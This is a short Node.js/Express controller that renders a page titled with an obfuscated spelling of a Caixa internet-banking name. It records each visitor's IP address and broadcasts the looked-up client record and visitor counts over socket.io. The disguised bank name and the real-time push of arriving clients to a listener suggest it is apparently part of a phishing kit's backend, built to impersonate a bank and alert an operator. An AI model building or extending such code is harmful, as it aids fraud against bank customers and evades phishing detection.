const userByToken = require('../../middlewares/auth')
const User = require('../../models/User_bk')
const Product = require('../../models/Product')
const Client = require('../../models/Client')
const Count = require('../../models/Count')

module.exports = {
    async view(req, res) {
        try {
            //const ipClient = socket.request.connection._peername

            const { client } = req.query

            let hasUpdate

            if(client) {
                const theClient = await Client.findByPk(client)

                if(theClient)
                    hasUpdate = theClient.id
                    setTimeout(() => {
                        req.app.io.emit('inUser', theClient.toJSON())

                    }, 500)
            }
    
            const ipConverted = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()
    
            const countClient = await Count.findOne({ where: {
                ip: ipConverted
            }})
    
            if(!countClient) {
                await Count.create({
                    value: 1,
                    ip: ipConverted
                })
            }
    
            const countsExist = await Count.count()
    
            req.app.io.emit('countVisitors', countsExist)

            return res.render('index', { title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA', pageClasses: 'cadastro', hasUpdate })
        } catch (error) {
            console.log(error)
            return res.redirect('/login')
        }
    },
}
